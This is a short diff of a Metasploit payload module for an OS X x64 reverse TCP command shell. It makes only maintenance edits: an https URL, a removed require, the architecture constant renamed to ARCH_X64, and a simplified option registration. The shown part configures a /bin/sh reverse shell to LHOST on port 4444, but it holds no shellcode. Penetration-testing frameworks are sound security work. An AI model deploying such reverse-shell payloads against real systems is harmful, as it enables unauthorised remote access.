@@ -1,10 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 
 module MetasploitModule
@@ -22,7 +20,7 @@ module MetasploitModule
       'Author'        => 'nemo <nemo[at]felinemenace.org>',
       'License'       => MSF_LICENSE,
       'Platform'      => 'osx',
-      'Arch'          => ARCH_X86_64,
+      'Arch'          => ARCH_X64,
       'Handler'       => Msf::Handler::ReverseTcp,
       'Session'       => Msf::Sessions::CommandShellUnix
     ))
@@ -34,7 +32,7 @@ module MetasploitModule
         OptString.new('CMD',   [ true,  "The command string to execute", "/bin/sh" ]),
         Opt::LHOST,
         Opt::LPORT(4444)
-    ], self.class)
+    ])
   end
 
   # build the shellcode payload dynamically based on the user-provided CMD
